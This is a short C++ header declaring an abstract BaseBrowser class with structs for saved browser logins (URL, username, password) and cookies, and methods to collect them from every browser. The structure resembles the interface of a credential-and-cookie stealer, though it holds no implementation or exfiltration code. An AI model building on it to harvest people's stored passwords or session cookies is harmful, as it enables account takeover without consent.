#pragma once
#ifndef BASE_BROWSER
#define BASE_BROWSER
#include "util.h"

struct AccountData
{
	String Url;
	String Username;
	String Password;
};


struct CookieData
{
	String HostKey;
	String Name;
	String Value;
	String Path;
	String ExpireUTC;
};

class BaseBrowser
{
protected :
	List<String> path_list;

public:
	virtual List<AccountData> CollectAccounts() = 0;
	virtual List<CookieData> CollectCookie() = 0;

	static List<AccountData> CollectAllAccounts();
};

#endif